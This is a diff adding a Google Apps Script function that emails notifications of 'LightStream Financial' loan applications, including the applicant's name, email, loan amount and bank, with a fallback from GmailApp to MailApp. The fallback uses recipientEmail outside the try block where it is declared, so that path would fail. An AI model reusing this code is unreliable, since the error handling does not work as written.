@@ -1,0 +1,42 @@
+// Alternative email function using GmailApp
+function sendEmailNotificationGmail(data) {
+  try {
+    const recipientEmail = "your-email@example.com"; // Change to your email
+    
+    const subject = "🏦 New Loan Application - LightStream Financial";
+    
+    const body = `
+New loan application received:
+
+Customer: ${data.name || data.fullName || 'N/A'}
+Email: ${data.email || 'N/A'}
+Loan Amount: $${data.loanAmount || 'N/A'}
+Bank: ${data.bankName || data.customerBank || 'N/A'}
+
+Submitted: ${new Date().toLocaleString()}
+
+---
+Full details in Google Sheet
+    `;
+
+    // Try GmailApp instead of MailApp
+    GmailApp.sendEmail(recipientEmail, subject, body);
+    
+    console.log("✅ Email sent via GmailApp");
+    
+  } catch (error) {
+    console.log("❌ GmailApp failed: " + error.message);
+    
+    // Last resort - try simple MailApp
+    try {
+      MailApp.sendEmail({
+        to: recipientEmail,
+        subject: "New Application",
+        body: "New loan application received. Check Google Sheet."
+      });
+      console.log("✅ Simple email sent");
+    } catch (simpleError) {
+      console.log("❌ All email methods failed");
+    }
+  }
+}
